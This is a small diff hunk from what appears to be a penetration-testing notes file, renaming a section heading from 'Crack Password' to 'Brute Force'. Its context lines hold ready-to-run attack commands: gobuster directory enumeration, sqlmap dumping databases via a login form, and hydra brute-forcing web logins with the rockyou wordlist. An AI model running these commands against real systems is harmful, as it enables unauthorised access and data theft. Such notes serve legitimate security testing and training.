@@ -22,7 +22,7 @@ $gobuster -u http://example.com -x php.txt,html -w /usr/share/dirb/wordlists/big
 
 $sqlmap -u http://Target_IP/login.php --forms --dump
 
-# 4° Crack Password
+# 4° Brute Force
 
 $hydra -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP http-post-form "/login.php:username=^USER^&password=^PASS^:Login Failed"
 
